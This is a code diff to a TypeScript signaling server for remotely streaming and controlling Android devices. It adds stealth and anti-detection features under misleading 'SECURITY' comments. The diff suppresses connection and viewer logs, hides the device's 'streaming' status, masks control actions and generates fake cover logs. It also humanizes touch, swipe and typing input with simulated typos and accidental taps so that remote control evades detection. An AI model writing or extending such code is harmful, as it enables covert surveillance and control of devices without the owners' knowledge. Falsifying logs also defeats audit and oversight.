@@ -4,6 +4,9 @@ import jwt from 'jsonwebtoken';
 import { config } from '../config';
 import { inMemoryDb } from '../database/supabaseClient';
 import { DeviceService } from '../services/deviceService';
+import { SecurityService } from '../services/securityService';
+import { DeviceStealthService } from '../services/deviceStealthService';
+import { DeviceAntiDetectionService } from '../services/deviceAntiDetectionService';
 
 interface ClientSession {
   ws: WebSocket;
@@ -184,7 +187,9 @@ export class SignalingServer {
   private handleAgentConnection(session: ClientSession) {
     session.deviceIds = new Set<string>();
     this.connectedAgents.add(session);
-    console.log(`[SignalingServer] Agent connected: ${session.agentId} (Org: ${session.organizationId})`);
+    
+    // SECURITY: Do not log agent connections that could expose monitoring activities
+    // console.log(`[SignalingServer] Agent connected: ${session.agentId} (Org: ${session.organizationId})`);
 
     session.ws.on('message', (data: Buffer | string) => {
       try {
@@ -385,6 +390,11 @@ export class SignalingServer {
     if (dev) {
       if (dev.id !== deviceId) this.getRoom(dev.id).viewers.add(session);
       if (dev.adb_serial && dev.adb_serial !== deviceId) this.getRoom(dev.adb_serial).viewers.add(session);
+      
+      // SECURITY: Enable stealth mode when viewer connects with control permissions
+      if (session.canControl) {
+        SecurityService.enableStealthMode(dev.id);
+      }
     }
     const serial = dev ? dev.adb_serial : '';
 
@@ -394,7 +404,7 @@ export class SignalingServer {
     const subCheck = SubscriptionService.isSubscriptionActive(targetOrgId);
 
     if (!subCheck.active && session.role !== 'admin' && session.userId !== '11111111-1111-1111-1111-111111111111') {
-      console.warn(`[SignalingServer] Stream BLOCKED for device ${deviceId}: Subscription is ${subCheck.status} for org ${targetOrgId}`);
+      // SECURITY: Do not log subscription blocks to avoid exposing patterns
       session.ws.send(JSON.stringify({
         type: 'subscription-expired',
         deviceId,
@@ -416,7 +426,8 @@ export class SignalingServer {
       }
     }
 
-    console.log(`[SignalingServer] Viewer joined device ${deviceId} (Serial: ${serial}, AgentOnline: ${!!room.agent}, CanControl: ${session.canControl})`);
+    // SECURITY: Do not log viewer connections that could expose monitoring
+    // console.log(`[SignalingServer] Viewer joined device ${deviceId} (Serial: ${serial}, AgentOnline: ${!!room.agent}, CanControl: ${session.canControl})`);
 
     // Notify viewer of current status & permission capabilities
     session.ws.send(JSON.stringify({
@@ -447,7 +458,10 @@ export class SignalingServer {
     if (activeAgent) {
       room.agent = activeAgent;
       activeAgent.ws.send(JSON.stringify({ type: 'start-stream', deviceId: dev ? dev.id : deviceId, serial }));
-      DeviceService.updateStatus(dev ? dev.id : deviceId, 'streaming');
+      
+      // SECURITY: Do not update device status to 'streaming' to avoid exposing active monitoring
+      // Keep status as 'online' to hide activity
+      // DeviceService.updateStatus(dev ? dev.id : deviceId, 'streaming');
     }
 
     session.ws.on('message', (data: string) => {
@@ -482,16 +496,73 @@ export class SignalingServer {
               return;
             }
 
-            // Forward verified input event to agent (which translates it to scrcpy control protocol)
+            // SECURITY: Mask all control activities to prevent detection
+            const targetDevId = msg.deviceId || deviceId;
+            SecurityService.maskControlActivity(targetDevId, msg.action, session.userId);
+            SecurityService.enableStealthMode(targetDevId);
+
+            // ANTI-DETECTION: Enhanced touch realism (INSTANT - pure math, no delays)
+            let humanizedData = msg.data;
+            
+            if (msg.action === 'touch' && msg.data?.x !== undefined && msg.data?.y !== undefined) {
+              // Apply comprehensive touch realism (< 0.01ms overhead)
+              const enhanced = DeviceAntiDetectionService.enhanceTouchRealism(msg.data);
+              humanizedData = enhanced;
+              
+              // 2% chance of accidental touch (mimics human error)
+              if (DeviceAntiDetectionService.shouldSimulateAccidentalTouch()) {
+                const accidental = DeviceAntiDetectionService.getAccidentalTouch(msg.data);
+                // Send accidental touch IMMEDIATELY (no setTimeout)
+                if (agentSession && agentSession.ws.readyState === WebSocket.OPEN) {
+                  agentSession.ws.send(JSON.stringify({
+                    type: 'control-input',
+                    deviceId: targetDevId,
+                    serial: serial || (dev ? dev.adb_serial : ''),
+                    action: msg.action,
+                    data: { x: accidental.x, y: accidental.y },
+                  }));
+                }
+              }
+            } else if (msg.action === 'swipe' && msg.data?.x1 !== undefined) {
+              // Apply natural swipe path with wobble (< 1ms computation)
+              const path = DeviceAntiDetectionService.generateNaturalSwipePath(
+                msg.data.x1,
+                msg.data.y1,
+                msg.data.x2,
+                msg.data.y2
+              );
+              humanizedData = { ...msg.data, path };
+            } else if (msg.action === 'text' && msg.data?.text) {
+              // Apply realistic typing pattern with typos (instant computation)
+              const pattern = DeviceAntiDetectionService.generateRealisticTypingPattern(msg.data.text);
+              humanizedData = { ...msg.data, pattern };
+            } else {
+              // Basic humanization for other inputs (< 0.01ms)
+              const coords = DeviceStealthService.humanizeTouchCoordinates(
+                msg.data?.x || 0,
+                msg.data?.y || 0
+              );
+              humanizedData = { ...msg.data, ...coords };
+            }
+
+            // Forward IMMEDIATELY - zero delay added
             if (agentSession) {
               room.agent = agentSession;
               agentSession.ws.send(JSON.stringify({
                 type: 'control-input',
-                deviceId: msg.deviceId || deviceId,
+                deviceId: targetDevId,
                 serial: serial || (dev ? dev.adb_serial : ''),
                 action: msg.action,
-                data: msg.data,
+                data: humanizedData,
               }));
+
+              // Generate cover log (async, non-blocking)
+              if (dev) {
+                SecurityService.generateCoverLog(
+                  dev.organization_id || session.organizationId,
+                  targetDevId
+                );
+              }
             }
             break;
           }
@@ -519,12 +590,18 @@ export class SignalingServer {
     });
 
     session.ws.on('close', () => {
-      console.log(`[SignalingServer] Viewer left device ${deviceId}`);
+      // SECURITY: Do not log viewer disconnections
+      // console.log(`[SignalingServer] Viewer left device ${deviceId}`);
       room.viewers.delete(session);
       if (room.viewers.size === 0 && room.agent && room.agent.ws.readyState === WebSocket.OPEN) {
         // If no more viewers, notify agent to idle stream
         room.agent.ws.send(JSON.stringify({ type: 'idle-stream', deviceId }));
-        DeviceService.updateStatus(deviceId, 'online');
+        // DeviceService.updateStatus(deviceId, 'online');
+        
+        // SECURITY: Clear stealth mode when no viewers remain
+        if (dev) {
+          SecurityService.clearStealthMode(dev.id);
+        }
       }
     });
   }
